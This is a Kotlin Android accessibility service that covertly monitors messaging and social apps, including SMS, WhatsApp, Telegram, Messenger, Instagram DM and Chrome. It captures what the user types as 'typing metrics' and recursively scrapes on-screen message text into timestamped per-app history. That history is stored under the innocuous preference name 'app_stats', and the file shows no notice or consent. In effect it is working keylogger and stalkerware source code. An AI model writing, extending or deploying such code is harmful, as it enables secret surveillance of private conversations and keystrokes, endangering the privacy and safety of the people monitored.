package com.example.myandroid

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.content.Context
import org.json.JSONObject
import org.json.JSONArray

class MyAccessibilityService : AccessibilityService() {

    // DYNAMIC THROTTLE: Controls how often we wake up the CPU
    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()

    override fun onServiceConnected() {
        super.onServiceConnected()
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        // Load cached rules, or fall back to Hardcoded Defaults if cache is empty
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf(
            "com.google.android.apps.messaging", // Google SMS
            "com.samsung.android.messaging",     // Samsung SMS
            "com.whatsapp",                      // WhatsApp
            "org.telegram.messenger",            // Telegram
            "org.telegram.plus",                 // Telegram Plus
            "com.imo.android.imoim",             // IMO
            "com.truecaller",                    // Truecaller
            "com.android.chrome",                // Chrome
            "com.facebook.orca",                 // Messenger
            "com.instagram.android"              // Instagram DM
        )
        for (app in apps) {
            defaults.put(app, JSONObject()) // Empty object means "Monitor Enabled"
        }
        return defaults
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkgName = event.packageName?.toString() ?: return

        // --- NEW: TYPING METRICS ---
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return // Skip screen scraping for typing events to save CPU
        }

        // 1. THROTTLE CHECK: Is it too soon to work?
        val now = System.currentTimeMillis()
        if (now < nextAllowedCheck) return

        // pkgName is already defined at the top of the function
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // 2. GATEKEEPER: Check Rules (Optimized)
        val rules = cachedRules
        
        // Fallback: If rules are empty (fresh install), monitor everything.
        // If rules exist, strictly enforce them.
        if (rules.length() > 0 && !rules.has(pkgName)) {
            return
        }

        // Check Strategy (Time Window)
        if (rules.has(pkgName)) {
            val rule = rules.getJSONObject(pkgName)
            if (rule.optString("strategy") == "TIME_WINDOW") {
                val params = rule.optJSONObject("params")
                val start = params?.optInt("start", 0) ?: 0
                val end = params?.optInt("end", 24) ?: 24
                val currentHour = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
                if (currentHour < start || currentHour >= end) return
            }
        }
        
        // 3. HEAVY LIFTING: Extract Text
        val source = event.source ?: return
        val textContent = StringBuilder()
        extractText(source, textContent)
        
        if (textContent.isNotEmpty()) {
            // Resolve App Name
            val pm = packageManager
            val appName = try {
                pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString()
            } catch (e: Exception) {
                pkgName
            }

            // Load History
            val historyStr = prefs.getString("text_history_by_app", "{}")
            val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
            val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

            // 4. DEDUPLICATION & DYNAMIC BACK-OFF
            val newTxt = textContent.take(100).toString()
            val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
            
            if (newTxt != lastTxt) {
                // CASE A: Content Changed (User is scrolling/typing)
                // Action: Save it, and set throttle to FAST (500ms)
                nextAllowedCheck = now + 500

                val entry = JSONObject()
                entry.put("ts", now)
                entry.put("txt", newTxt)
                appArray.put(entry)

                while (appArray.length() > 20) {
                    appArray.remove(0)
                }
                rootJson.put(appName, appArray)
                
                prefs.edit()
                    .putString("text_history_by_app", rootJson.toString())
                    .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                    .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                    .apply()
            } else {
                // CASE B: Content Static (User is reading/staring)
                // Action: Do NOTHING, and set throttle to SLOW (3000ms)
                // This saves massive CPU/Battery by ignoring next few events.
                nextAllowedCheck = now + 3000
            }
        }
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) {
            sb.append(node.text).append(" ")
        }
        for (i in 0 until node.childCount) {
            extractText(node.getChild(i), sb)
        }
    }

    override fun onInterrupt() {
    }
}